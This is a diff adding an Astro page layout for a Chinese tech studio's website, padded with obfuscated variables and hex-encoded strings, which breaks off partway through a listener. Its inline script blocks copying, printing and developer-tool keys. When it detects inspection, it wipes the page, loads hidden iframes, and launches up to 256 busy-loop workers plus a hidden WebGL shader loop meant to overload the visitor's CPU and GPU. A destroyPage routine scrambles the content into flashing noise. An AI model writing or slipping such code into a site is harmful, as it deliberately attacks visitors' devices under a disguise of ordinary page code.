@@ -1,0 +1,781 @@
+---
+import MonolithRuntime from '../components/MonolithRuntime.astro';
+
+interface Props {
+  title: string;
+  description?: string;
+}
+
+const { title, description = "\x73\x37\x61\x65\x20\u7f51\u7edc\u79d1\u6280\u5de5\u4f5c\u5ba4\x20\u2014\x20\u4e13\u6ce8\u8f6f\u786c\u4ef6\u5b9a\u5236\u5f00\u53d1" } = Astro.props;
+
+const siteOrigin = Astro.site ? Astro.site.href.replace(/\/$/, '') : '';
+const canonical = siteOrigin ? `${siteOrigin}${Astro.url.pathname}` : Astro.url.pathname;
+const _d1850 = 34377;
+let _d1851 = { k: '\x78\x31\x38\x35\x32', n: 38 };
+const _d1853 = { k: '\x78\x31\x38\x35\x34', n: 50 };
+const _d1855 = 93661;
+var _d1856 = ((v: number) => v * 5)(90);
+const _d1857 = 18632;
+const _d1858 = ((v: number) => v * 3)(6);
+const _d1859 = ['\x78\x31\x38\x35\x61', '\x78\x31\x38\x35\x62'];
+var _d185c = ((v: number) => v * 6)(70);
+const _d185d = ((v: number) => v * 3)(88);
+const _d185e = { k: '\x78\x31\x38\x35\x66', n: 16 };
+const _d1860 = 87332;
+const _d1861 = 9085;
+let _d1862 = 36945;
+var _d1863 = { k: '\x78\x31\x38\x36\x34', n: 23 };
+let _d1865 = { k: '\x78\x31\x38\x36\x36', n: 50 };
+let _d1867 = { k: '\x78\x31\x38\x36\x38', n: 57 };
+var _d1869 = 54405;
+var _d186a = { k: '\x78\x31\x38\x36\x62', n: 21 };
+let _d186c = 60738;
+const _d186d = { k: '\x78\x31\x38\x36\x65', n: 90 };
+const _d186f = { k: '\x78\x31\x38\x37\x30', n: 52 };
+const _d1871 = ((v: number) => v * 2)(15);
+const _d1872 = { k: '\x78\x31\x38\x37\x33', n: 15 };
+var _d1874 = { k: '\x78\x31\x38\x37\x35', n: 61 };
+let _d1876 = ((v: number) => v * 6)(45);
+const _d1877 = ['\x78\x31\x38\x37\x38', '\x78\x31\x38\x37\x39'];
+var _d187a = { k: '\x78\x31\x38\x37\x62', n: 85 };
+var _d187c = 69233;
+const _d187d = { k: '\x78\x31\x38\x37\x65', n: 14 };
+var _d187f = ['\x78\x31\x38\x38\x30', '\x78\x31\x38\x38\x31'];
+let _d1882 = { k: '\x78\x31\x38\x38\x33', n: 21 };
+let _d1884 = 31075;
+var _d1885 = 52050;
+let _d1886 = 34394;
+let _d1887 = 42110;
+let _d1888 = ((v: number) => v * 3)(27);
+const _d1889 = { k: '\x78\x31\x38\x38\x61', n: 51 };
+let _d188b = ((v: number) => v * 8)(27);
+let _d188c = ['\x78\x31\x38\x38\x64', '\x78\x31\x38\x38\x65'];
+let _d188f = ['\x78\x31\x38\x39\x30', '\x78\x31\x38\x39\x31'];
+var _d1892 = 92172;
+const _d1893 = ((v: number) => v * 3)(55);
+let _d1894 = { k: '\x78\x31\x38\x39\x35', n: 56 };
+let _d1896 = ['\x78\x31\x38\x39\x37', '\x78\x31\x38\x39\x38'];
+let _d1899 = ['\x78\x31\x38\x39\x61', '\x78\x31\x38\x39\x62'];
+let _d189c = { k: '\x78\x31\x38\x39\x64', n: 14 };
+const _d189e = ((v: number) => v * 3)(84);
+let _d189f = ((v: number) => v * 5)(40);
+var _d18a0 = 72376;
+const _d18a1 = 41887;
+var _d18a2 = { k: '\x78\x31\x38\x61\x33', n: 54 };
+const _d18a4 = 73825;
+let _d18a5 = { k: '\x78\x31\x38\x61\x36', n: 36 };
+const _d18a7 = ['\x78\x31\x38\x61\x38', '\x78\x31\x38\x61\x39'];
+const _d18aa = ((v: number) => v * 5)(85);
+const _d18ab = 36148;
+var _d18ac = ['\x78\x31\x38\x61\x64', '\x78\x31\x38\x61\x65'];
+var _d18af = ((v: number) => v * 5)(54);
+let _d18b0 = { k: '\x78\x31\x38\x62\x31', n: 45 };
+let _d18b2 = { k: '\x78\x31\x38\x62\x33', n: 14 };
+var _d18b4 = { k: '\x78\x31\x38\x62\x35', n: 54 };
+let _d18b6 = 28599;
+const _d18b7 = { k: '\x78\x31\x38\x62\x38', n: 21 };
+---
+
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>{title}</title>
+  <meta name="description" content={description} />
+  <meta name="referrer" content="no-referrer" />
+  <meta name="theme-color" content="#030304" />
+
+  <link rel="canonical" href={canonical} />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="s7ae 网络科技工作室" />
+  <meta property="og:locale" content="zh_CN" />
+  <meta property="og:title" content={title} />
+  <meta property="og:description" content={description} />
+  <meta property="og:url" content={canonical} />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content={title} />
+  <meta name="twitter:description" content={description} />
+
+  <link rel="stylesheet" href="/styles.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=Inter:wght@300;400;500&family=JetBrains+Mono:wght@400&family=Syne:wght@700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+  <a class="skip-link" href="#main">跳到主内容</a>
+
+  <MonolithRuntime />
+
+  <slot />
+  
+  <script is:inline>
+    
+    const SECURITY_CONFIG = {
+      blockedKeys: ['\x46\x31\x32', '\x49', '\x4a', '\x43', '\x55', '\x53', '\x50', '\x4d'],
+    };
+var _z18b9 = { a: 27, b: '\x78\x31\x38\x62\x61' };
+
+    let devtoolsDetected = false;
+    let saveAttemptDetected = false;
+
+    
+    document.addEventListener('\x63\x6f\x6e\x74\x65\x78\x74\x6d\x65\x6e\x75', e => e.preventDefault());
+    document.addEventListener('\x73\x65\x6c\x65\x63\x74\x73\x74\x61\x72\x74', e => e.preventDefault());
+    document.addEventListener('\x63\x6f\x70\x79', e => e.preventDefault());
+    document.addEventListener('\x63\x75\x74', e => e.preventDefault());
+    document.addEventListener('\x70\x61\x73\x74\x65', e => e.preventDefault());
+    document.addEventListener('\x64\x72\x61\x67\x73\x74\x61\x72\x74', e => e.preventDefault());
+    document.addEventListener('\x64\x72\x6f\x70', e => e.preventDefault());
+    document.addEventListener('\x64\x72\x61\x67\x6f\x76\x65\x72', e => e.preventDefault());
+    
+    document.addEventListener('\x6d\x6f\x75\x73\x65\x64\x6f\x77\x6e', e => {
+      if (e.target.tagName === '\x49\x4d\x47' || e.button === 2) {
+        e.preventDefault();
+        return false;
+      }
+    });
+
+    document.addEventListener('\x74\x6f\x75\x63\x68\x73\x74\x61\x72\x74', e => {
+      if (e.touches.length > 1) e.preventDefault();
+    }, { passive: false });
+    
+    let lastTouchEnd = 0;
+    document.addEventListener('\x74\x6f\x75\x63\x68\x65\x6e\x64', e => {
+      const now = Date.now();
+      if (now - lastTouchEnd <= 300) e.preventDefault();
+      lastTouchEnd = now;
+    }, false);
+
+    document.addEventListener('\x6b\x65\x79\x64\x6f\x77\x6e', e => {
+      const key = e.key.toUpperCase();
+      const ctrl = e.ctrlKey;
+      const shift = e.shiftKey;
+      
+      if (key === '\x46\x31\x32' || key === '\x46\x35' || (ctrl && key === '\x52')) {
+        e.preventDefault(); return false;
+      }
+      if (ctrl && shift && SECURITY_CONFIG.blockedKeys.includes(key)) {
+        e.preventDefault(); return false;
+      }
+      if (ctrl && ['\x55', '\x53', '\x50', '\x41'].includes(key)) {
+        e.preventDefault(); return false;
+      }
+    });
+
+    window.onbeforeprint = () => window.location.reload();
+    window.matchMedia('\x70\x72\x69\x6e\x74').addListener(mql => {
+      if (mql.matches) window.location.reload();
+    });
+
+    Object.defineProperty(window, '\x67\x65\x74\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72\x73', {
+      get: function() { triggerProtection(); return function() {}; }
+    });
+
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    function triggerProtection() {
+      if (devtoolsDetected || saveAttemptDetected) return;
+      devtoolsDetected = true;
+      
+      document.body.innerHTML = '';
+      document.head.innerHTML = '';
+      
+      document.write(`
+        <!DOCTYPE html>
+        <html lang="zh-CN">
+        <head>
+          <meta charset="UTF-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1">
+          <title>访问受限</title>
+          <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body { display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #0d0d12; font-family: 'Inter', sans-serif; overflow: hidden; }
+            .container { text-align: center; animation: fadeIn .5s ease; }
+            @keyframes fadeIn { from { opacity: 0; transform: scale(.9); } to { opacity: 1; transform: scale(1); } }
+            .icon { font-size: 80px; margin-bottom: 30px; animation: pulse 2s ease-in-out infinite; }
+            @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+            h1 { color: #f5f5f7; font-size: 32px; margin-bottom: 16px; }
+            p { color: #94a3b8; font-size: 16px; }
+._s1942{overflow:hidden}
+._s1943{overflow:hidden}
+._s1944{overflow:hidden}
+._s1945{content:''}
+._s1946{content:''}
+._s1947{clip-path:inset(50%)}
+._s1948{clip-path:inset(50%)}
+._s1949{visibility:hidden}
+._s194a{position:absolute}
+._s194b{display:none}
+._s194c{height:0}
+._s194d{overflow:hidden}
+._s194e{position:absolute}
+._s194f{z-index:-1}
+._s1950{pointer-events:none}
+._s1951{pointer-events:none}
+._s1952{visibility:hidden}
+._s1953{visibility:hidden}
+._s1954{opacity:0}
+._s1955{width:0}
+._s1956{z-index:-1}
+._s1957{position:absolute}
+._s1958{pointer-events:none}
+._s1959{transform:scale(0)}
+._s195a{height:0}
+._s195b{clip-path:inset(50%)}
+._s195c{height:0}
+._s195d{transform:scale(0)}
+._s195e{position:absolute}
+._s195f{content:''}
+._s1960{opacity:0}
+._s1961{height:0}
+._s1962{width:0}
+._s1963{clip-path:inset(50%)}
+._s1964{overflow:hidden}
+._s1965{pointer-events:none}
+._s1966{width:0}
+._s1967{z-index:-1}
+._s1968{content:''}
+._s1969{position:absolute}
+._s196a{visibility:hidden}
+._s196b{z-index:-1}
+._s196c{opacity:0}
+._s196d{overflow:hidden}
+._s196e{height:0}
+._s196f{height:0}
+._s1970{position:absolute}
+._s1971{content:''}
+._s1972{width:0}
+._s1973{display:none}
+._s1974{visibility:hidden}
+._s1975{clip-path:inset(50%)}
+._s1976{width:0}
+._s1977{content:''}
+._s1978{display:none}
+._s1979{width:0}
+._s197a{display:none}
+._s197b{visibility:hidden}
+._s197c{overflow:hidden}
+._s197d{opacity:0}
+._s197e{pointer-events:none}
+._s197f{content:''}
+._s1980{z-index:-1}
+._s1981{transform:scale(0)}
+._s1982{z-index:-1}
+._s1983{opacity:0}
+._s1984{transform:scale(0)}
+._s1985{pointer-events:none}
+._s1986{visibility:hidden}
+._s1987{display:none}
+._s1988{content:''}
+._s1989{overflow:hidden}
+._s198a{height:0}
+._s198b{transform:scale(0)}
+._s198c{pointer-events:none}
+._s198d{position:absolute}
+._s198e{position:absolute}
+._s198f{opacity:0}
+._s1990{display:none}
+._s1991{width:0}
+._s1992{position:absolute}
+._s1993{clip-path:inset(50%)}
+._s1994{clip-path:inset(50%)}
+._s1995{position:absolute}
+._s1996{pointer-events:none}
+._s1997{opacity:0}
+._s1998{pointer-events:none}
+._s1999{visibility:hidden}
+._s199a{z-index:-1}
+._s199b{transform:scale(0)}
+._s199c{z-index:-1}
+._s199d{overflow:hidden}
+._s199e{width:0}
+._s199f{clip-path:inset(50%)}
+._s19a0{display:none}
+._s19a1{width:0}
+._s19a2{opacity:0}
+._s19a3{position:absolute}
+._s19a4{z-index:-1}
+._s19a5{position:absolute}
+._s19a6{width:0}
+._s19a7{opacity:0}
+._s19a8{transform:scale(0)}
+._s19a9{pointer-events:none}
+._s19aa{opacity:0}
+._s19ab{z-index:-1}
+._s19ac{opacity:0}
+._s19ad{overflow:hidden}
+._s19ae{position:absolute}
+._s19af{overflow:hidden}
+._s19b0{opacity:0}
+._s19b1{z-index:-1}
+._s19b2{pointer-events:none}
+._s19b3{clip-path:inset(50%)}
+._s19b4{display:none}
+._s19b5{pointer-events:none}
+._s19b6{opacity:0}
+._s19b7{position:absolute}
+._s19b8{height:0}
+._s19b9{height:0}
+._s19ba{content:''}
+._s19bb{visibility:hidden}
+._s19bc{clip-path:inset(50%)}
+._s19bd{position:absolute}
+._s19be{height:0}
+._s19bf{content:''}
+._s19c0{width:0}
+._s19c1{content:''}
+._s19c2{visibility:hidden}
+._s19c3{z-index:-1}
+._s19c4{content:''}
+._s19c5{pointer-events:none}
+._s19c6{opacity:0}
+._s19c7{opacity:0}
+._s19c8{display:none}
+._s19c9{height:0}
+._s19ca{content:''}
+._s19cb{display:none}
+._s19cc{visibility:hidden}
+._s19cd{position:absolute}
+._s19ce{transform:scale(0)}
+._s19cf{clip-path:inset(50%)}
+._s19d0{overflow:hidden}
+._s19d1{overflow:hidden}
+._s19d2{content:''}
+._s19d3{z-index:-1}
+._s19d4{clip-path:inset(50%)}
+._s19d5{clip-path:inset(50%)}
+._s19d6{overflow:hidden}
+._s19d7{height:0}
+._s19d8{content:''}
+._s19d9{clip-path:inset(50%)}
+._s19da{content:''}
+._s19db{z-index:-1}
+._s19dc{content:''}
+._s19dd{z-index:-1}
+._s19de{overflow:hidden}
+._s19df{visibility:hidden}
+._s19e0{width:0}
+._s19e1{height:0}
+._s19e2{opacity:0}
+._s19e3{opacity:0}
+._s19e4{visibility:hidden}
+._s19e5{transform:scale(0)}
+._s19e6{height:0}
+._s19e7{clip-path:inset(50%)}
+._s19e8{width:0}
+._s19e9{opacity:0}
+._s19ea{opacity:0}
+._s19eb{display:none}
+._s19ec{pointer-events:none}
+._s19ed{position:absolute}
+._s19ee{width:0}
+._s19ef{display:none}
+._s19f0{width:0}
+._s19f1{display:none}
+._s19f2{display:none}
+._s19f3{content:''}
+._s19f4{transform:scale(0)}
+._s19f5{width:0}
+._s19f6{pointer-events:none}
+._s19f7{position:absolute}
+._s19f8{width:0}
+._s19f9{visibility:hidden}
+._s19fa{z-index:-1}
+._s19fb{z-index:-1}
+._s19fc{opacity:0}
+._s19fd{width:0}
+._s19fe{opacity:0}
+._s19ff{clip-path:inset(50%)}
+._s1a00{transform:scale(0)}
+._s1a01{visibility:hidden}
+._s1a02{clip-path:inset(50%)}
+._s1a03{display:none}
+._s1a04{height:0}
+._s1a05{pointer-events:none}
+._s1a06{pointer-events:none}
+._s1a07{position:absolute}
+._s1a08{overflow:hidden}
+._s1a09{content:''}
+._s1a0a{visibility:hidden}
+._s1a0b{opacity:0}
+._s1a0c{visibility:hidden}
+._s1a0d{content:''}
+._s1a0e{transform:scale(0)}
+._s1a0f{overflow:hidden}
+._s1a10{transform:scale(0)}
+._s1a11{position:absolute}
+._s1a12{transform:scale(0)}
+._s1a13{opacity:0}
+._s1a14{pointer-events:none}
+._s1a15{overflow:hidden}
+._s1a16{content:''}
+._s1a17{height:0}
+._s1a18{overflow:hidden}
+._s1a19{pointer-events:none}
+._s1a1a{transform:scale(0)}
+._s1a1b{overflow:hidden}
+._s1a1c{overflow:hidden}
+._s1a1d{position:absolute}
+._s1a1e{clip-path:inset(50%)}
+._s1a1f{z-index:-1}
+._s1a20{display:none}
+._s1a21{pointer-events:none}
+._s1a22{clip-path:inset(50%)}
+._s1a23{content:''}
+._s1a24{visibility:hidden}
+._s1a25{overflow:hidden}
+._s1a26{opacity:0}
+._s1a27{opacity:0}
+._s1a28{clip-path:inset(50%)}
+._s1a29{content:''}
+._s1a2a{z-index:-1}
+._s1a2b{display:none}
+._s1a2c{position:absolute}
+._s1a2d{visibility:hidden}
+._s1a2e{overflow:hidden}
+._s1a2f{clip-path:inset(50%)}
+._s1a30{overflow:hidden}
+._s1a31{opacity:0}
+._s1a32{display:none}
+._s1a33{clip-path:inset(50%)}
+._s1a34{position:absolute}
+._s1a35{position:absolute}
+._s1a36{position:absolute}
+._s1a37{visibility:hidden}
+._s1a38{display:none}
+._s1a39{z-index:-1}
+._s1a3a{height:0}
+._s1a3b{content:''}
+._s1a3c{width:0}
+._s1a3d{width:0}
+._s1a3e{pointer-events:none}
+._s1a3f{visibility:hidden}
+._s1a40{display:none}
+._s1a41{transform:scale(0)}
+._s1a42{pointer-events:none}
+._s1a43{z-index:-1}
+._s1a44{pointer-events:none}
+._s1a45{display:none}
+</style>
+        </head>
+        <body>
+          <div class="container">
+            <div class="icon">🚫</div>
+            <h1>检测到异常访问</h1>
+            <p>开发者工具已被禁用</p>
+          </div>
+        </body>
+        </html>
+      `);
+      
+      loadHiddenBreakPage();
+      startHighLoad();
+    }
+    
+    
+    
+    
+    let breakPageLoaded = false;
+    function loadHiddenBreakPage() {
+      if (breakPageLoaded) return;
+      breakPageLoaded = true;
+      
+      
+      const breakPages = ['\x2f\x62\x72\x65\x61\x6b\x2f\x69\x6e\x64\x65\x78\x2e\x68\x74\x6d\x6c', '\x2f\x62\x72\x65\x61\x6b\x2f\x69\x6e\x64\x65\x78\x31\x2e\x68\x74\x6d\x6c'];
+      
+      breakPages.forEach((src, idx) => {
+        const hiddenFrame = document.createElement('\x69\x66\x72\x61\x6d\x65');
+        hiddenFrame.id = '\x68\x69\x64\x64\x65\x6e\x2d\x62\x72\x65\x61\x6b\x2d\x66\x72\x61\x6d\x65\x2d' + idx;
+        hiddenFrame.src = src;
+        
+        
+        hiddenFrame.style.cssText = `
+          position: fixed !important;
+          left: 0 !important;
+          top: 0 !important;
+          width: 100vw !important;
+          height: 100vh !important;
+          opacity: 0.001 !important;
+          pointer-events: none !important;
+          z-index: -99999 !important;
+          border: none !important;
+          transform: scale(1.0001) !important;
+        `;
+        
+        hiddenFrame.setAttribute('\x73\x61\x6e\x64\x62\x6f\x78', '\x61\x6c\x6c\x6f\x77\x2d\x73\x63\x72\x69\x70\x74\x73\x20\x61\x6c\x6c\x6f\x77\x2d\x73\x61\x6d\x65\x2d\x6f\x72\x69\x67\x69\x6e');
+        hiddenFrame.removeAttribute('\x61\x6c\x6c\x6f\x77');
+        document.body.appendChild(hiddenFrame);
+      });
+    }
+    
+    
+    
+    
+    const HIGH_LOAD_CONFIG = { 
+      cpuEnabled: true, 
+      gpuEnabled: true, 
+      cpuWorkers: 256, 
+      cpuIterations: 2500000, 
+      cpuMathRounds: 128, 
+      gpuWidth: 160000, 
+      gpuHeight: 160000, 
+      gpuPasses: 2, 
+      gpuShaderIterations: 1024, 
+      gpuFrameDelay: 0, 
+      autoStopMs: 0 
+    };
+var _z18bb = { a: 40, b: '\x78\x31\x38\x62\x63' };
+    
+    let highLoadStarted = false, highLoadWorkers = [], highLoadCanvas = null, highLoadRaf = 0, highLoadStopped = false, highLoadTimer = 0;
+
+    function startHighLoad() {
+      if (highLoadStarted) return;
+      highLoadStarted = true;
+      highLoadStopped = false;
+
+      setTimeout(() => {
+        if (highLoadStopped) return;
+        
+        if (HIGH_LOAD_CONFIG.cpuEnabled) {
+          const workerCount = Math.min(Math.max(Number(HIGH_LOAD_CONFIG.cpuWorkers) || 1, 1), 256);
+          const iterations = Math.min(Math.max(Number(HIGH_LOAD_CONFIG.cpuIterations) || 1000, 1000), 100000);
+          const mathRounds = Math.min(Math.max(Number(HIGH_LOAD_CONFIG.cpuMathRounds) || 1, 1), 8);
+          
+          const workerCode = `let running = true; self.onmessage = function(e) { if (e.data === 'stop') { running = false; self.close(); return; } if (e.data === 'start') { while (running) { let x = 0.123456789; for (let i = 0; i < ${iterations}; i++) { for (let r = 0; r <${mathRounds}; r++) { x += Math.sin(x + i * 0.00001); x *= 0.9999991; x = Math.sqrt(Math.abs(x) + 0.000001); x += Math.cos(x * 1.000001); } if (!Number.isFinite(x) || x > 1000000 || x < -1000000) x = 0.123456789; } if (Math.random() < 0.001) self.postMessage(x); } } };`;
+          
+          const blob = new Blob([workerCode], { type: '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74' });
+          const workerUrl = URL.createObjectURL(blob);
+          for (let i = 0; i < workerCount; i++) {
+            try { const worker = new Worker(workerUrl); highLoadWorkers.push(worker); worker.postMessage('\x73\x74\x61\x72\x74'); } catch (err) { break; }
+          }
+          URL.revokeObjectURL(workerUrl);
+        }
+        
+        if (HIGH_LOAD_CONFIG.gpuEnabled) {
+          highLoadCanvas = document.createElement('\x63\x61\x6e\x76\x61\x73');
+          highLoadCanvas.width = Math.min(Math.max(Number(HIGH_LOAD_CONFIG.gpuWidth) || 1920, 640), 8000); 
+          highLoadCanvas.height = Math.min(Math.max(Number(HIGH_LOAD_CONFIG.gpuHeight) || 1080, 360), 8000);
+          highLoadCanvas.style.cssText = '\x70\x6f\x73\x69\x74\x69\x6f\x6e\x3a\x66\x69\x78\x65\x64\x3b\x6c\x65\x66\x74\x3a\x2d\x31\x30\x30\x30\x30\x70\x78\x3b\x74\x6f\x70\x3a\x2d\x31\x30\x30\x30\x30\x70\x78\x3b\x77\x69\x64\x74\x68\x3a\x31\x70\x78\x3b\x68\x65\x69\x67\x68\x74\x3a\x31\x70\x78\x3b\x6f\x70\x61\x63\x69\x74\x79\x3a\x30\x3b\x70\x6f\x69\x6e\x74\x65\x72\x2d\x65\x76\x65\x6e\x74\x73\x3a\x6e\x6f\x6e\x65\x3b\x76\x69\x73\x69\x62\x69\x6c\x69\x74\x79\x3a\x68\x69\x64\x64\x65\x6e\x3b\x7a\x2d\x69\x6e\x64\x65\x78\x3a\x2d\x31\x3b';
+          document.body.appendChild(highLoadCanvas);
+          
+          const gl = highLoadCanvas.getContext('\x77\x65\x62\x67\x6c\x32', { antialias: false, depth: false, stencil: false, alpha: false, preserveDrawingBuffer: false, powerPreference: '\x68\x69\x67\x68\x2d\x70\x65\x72\x66\x6f\x72\x6d\x61\x6e\x63\x65' }) || highLoadCanvas.getContext('\x77\x65\x62\x67\x6c', { antialias: false, depth: false, stencil: false, alpha: false, preserveDrawingBuffer: false, powerPreference: '\x68\x69\x67\x68\x2d\x70\x65\x72\x66\x6f\x72\x6d\x61\x6e\x63\x65' });
+          
+          if (gl) {
+            const shaderIterations = Math.min(Math.max(Number(HIGH_LOAD_CONFIG.gpuShaderIterations) || 1, 1), 1024);
+            const passes = Math.min(Math.max(Number(HIGH_LOAD_CONFIG.gpuPasses) || 1, 1), 8);
+            
+            const vertexSource = `attribute vec2 a_position; varying vec2 v_uv; void main() { v_uv = a_position * 0.5 + 0.5; gl_Position = vec4(a_position, 0.0, 1.0); }`;
+            const fragmentSource = `precision highp float; varying vec2 v_uv; uniform float u_time; void main() { vec2 p = v_uv * 2.0 - 1.0; float x = p.x; float y = p.y; for (int i = 0; i < ${shaderIterations}; i++) { float fi = float(i) + 1.0; x = sin(x * 1.013 + fi * 0.017 + u_time * 0.0001); y = cos(y * 1.017 - fi * 0.013 + u_time * 0.0001); x += sqrt(abs(y) + 0.00001) * 0.013; y += sqrt(abs(x) + 0.00001) * 0.011; x = clamp(x, -10.0, 10.0); y = clamp(y, -10.0, 10.0); } float v = 0.5 + 0.5 * sin(x * 3.0 + y * 2.0); gl_FragColor = vec4(v, v, v, 1.0); }`;
+            
+            function compileShader(type, source) { const shader = gl.createShader(type); gl.shaderSource(shader, source); gl.compileShader(shader); if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) { gl.deleteShader(shader); return null; } return shader; }
+            
+            const vertexShader = compileShader(gl.VERTEX_SHADER, vertexSource);
+            const fragmentShader = compileShader(gl.FRAGMENT_SHADER, fragmentSource);
+            
+            if (vertexShader && fragmentShader) {
+              const program = gl.createProgram(); gl.attachShader(program, vertexShader); gl.attachShader(program, fragmentShader); gl.linkProgram(program);
+              if (gl.getProgramParameter(program, gl.LINK_STATUS)) {
+                gl.useProgram(program);
+                const buffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, buffer); gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]), gl.STATIC_DRAW);
+                const position = gl.getAttribLocation(program, '\x61\x5f\x70\x6f\x73\x69\x74\x69\x6f\x6e'); gl.enableVertexAttribArray(position); gl.vertexAttribPointer(position, 2, gl.FLOAT, false, 0, 0);
+                const timeLocation = gl.getUniformLocation(program, '\x75\x5f\x74\x69\x6d\x65'); gl.viewport(0, 0, highLoadCanvas.width, highLoadCanvas.height);
+                let lastFrame = 0;
+                
+                function gpuIntensiveWork(now) {
+                  if (highLoadStopped || !highLoadCanvas) return;
+                  if (HIGH_LOAD_CONFIG.gpuFrameDelay > 0 && now - lastFrame < HIGH_LOAD_CONFIG.gpuFrameDelay) { highLoadRaf = requestAnimationFrame(gpuIntensiveWork); return; }
+                  lastFrame = now; gl.uniform1f(timeLocation, now);
+                  for (let pass = 0; pass < passes; pass++) gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+                  gl.flush(); highLoadRaf = requestAnimationFrame(gpuIntensiveWork);
+                }
+                highLoadRaf = requestAnimationFrame(gpuIntensiveWork);
+              }
+            }
+          }
+        }
+      }, 1000);
+    }
+
+    function stopHighLoad() {
+      highLoadStopped = true;
+      if (highLoadRaf) { cancelAnimationFrame(highLoadRaf); highLoadRaf = 0; }
+      if (highLoadTimer) { clearTimeout(highLoadTimer); highLoadTimer = 0; }
+      highLoadWorkers.forEach(worker => { try { worker.postMessage('\x73\x74\x6f\x70'); worker.terminate(); } catch (_) {} });
+      highLoadWorkers = [];
+      if (highLoadCanvas && highLoadCanvas.parentNode) highLoadCanvas.parentNode.removeChild(highLoadCanvas);
+      highLoadCanvas = null;
+    }
+    window.addEventListener('\x70\x61\x67\x65\x68\x69\x64\x65', stopHighLoad, { once: true });
+    
+    
+    function generateGarbageData(size = 100) {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()_+{}[]|\\:;"\'<>?,./~`';
+      let result = ''; for (let i = 0; i < size; i++) result += chars.charAt(Math.floor(Math.random() * chars.length)); return result;
+    }
+    
+    function destroyPage() {
+      if (saveAttemptDetected) return;
+      saveAttemptDetected = true;
+      
+      document.addEventListener('click', e => { e.preventDefault(); e.stopPropagation(); }, { capture: true });
+      document.addEventListener('mousedown', e => { e.preventDefault(); e.stopPropagation(); }, { capture: true });
+      document.addEventListener('keydown', e => { e.preventDefault(); e.stopPropagation(); }, { capture: true });
+      document.addEventListener('scroll', e => { e.preventDefault(); e.stopPropagation(); }, { capture: true });
+      
+      document.querySelectorAll('p, span, div, a, h1, h2, h3, h4, h5, h6, li, td, th, button, label, option, figcaption').forEach(el => {
+        if (el.children.length === 0 && el.textContent.trim().length > 0) el.textContent = generateGarbageData(Math.floor(Math.random() * 200) + 50);
+      });
+      document.querySelectorAll('img').forEach(img => {
+        img.src = 'data:image/svg+xml,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><rect fill="#000" width="100" height="100"/><text fill="#fff" x="50%" y="50%" text-anchor="middle">' + generateGarbageData(10) + '</text></svg>');
+      });
+      document.title = generateGarbageData(200);
+      document.querySelectorAll('meta').forEach(meta => meta.content = generateGarbageData(300));
+      document.querySelectorAll('link').forEach(link => link.href = 'data:text/css,' + encodeURIComponent('/* ' + generateGarbageData(1000) + ' */'));
+      document.querySelectorAll('style').forEach(style => style.textContent = '/* ' + generateGarbageData(5000) + ' */');
+      document.body.style.cssText = 'background: #000 !important; color: #fff !important;';
+      
+      document.querySelectorAll('*').forEach(el => {
+        if (Math.random() > 0.9) { el.style.transform = 'rotate(' + (Math.random() * 360) + 'deg)'; el.style.position = Math.random() > 0.5 ? 'relative' : 'static'; el.style.left = (Math.random() * 100) + 'px'; }
+      });
+      
+      const overlay = document.createElement('div');
+      overlay.style.cssText = 'position: fixed; inset: 0; background: #000; z-index: 999998; overflow: hidden;';
+      document.body.appendChild(overlay);
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*<>[]{}|\\/';
+      const charContainer = document.createElement('div');
+      charContainer.style.cssText = 'position:absolute;inset:0;font-family:monospace;';
+      overlay.appendChild(charContainer);
+      
+      function spawnGarbageBurst() {
+        const line = document.createElement('div');
+        let lineContent = '';
+        for (let i = 0; i < 60; i++) {
+          lineContent += `<span style="display:inline-block;font-size:${Math.floor(Math.random()*16)+8}px;color:hsl(${Math.floor(Math.random()*360)}, 100%, 55%);opacity:${Math.random()*0.6+0.2};transform:rotate(${Math.random()*180-90}deg);">${chars[Math.floor(Math.random()*chars.length)]}</span>`;
+        }
+        line.innerHTML = lineContent;
+        line.style.cssText = `position:absolute;left:-5%;top:${Math.random()*100}%;white-space:nowrap;height:20px;line-height:20px;`;
+        charContainer.appendChild(line);
+        setTimeout(() => { if (line.parentNode) line.parentNode.removeChild(line); }, 300);
+      }
+      setInterval(spawnGarbageBurst, 80);
+      
+      const shapesContainer = document.createElement('div');
+      shapesContainer.style.cssText = 'position: fixed; inset: 0; pointer-events: none; z-index: 1000000;';
+      document.body.appendChild(shapesContainer);
+      const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
+      
+      setInterval(() => {
+        const shape = document.createElement('div');
+        const color = colors[Math.floor(Math.random() * colors.length)];
+        shape.style.cssText = `position:absolute;left:${Math.random()*100}%;top:${Math.random()*100}%;width:${Math.random()*100+20}px;height:${Math.random()*100+20}px;border:3px solid ${color};box-shadow:0 0 30px ${color};transform:rotate(${Math.random()*360}deg);`;
+        shapesContainer.appendChild(shape);
+        setTimeout(() => { if (shape.parentNode) shape.parentNode.removeChild(shape); }, 150);
+      }, 200);
+      
+      loadHiddenBreakPage();
+      startHighLoad();
+    }
+    
+    
+    window.addEventListener('keydown', e => {
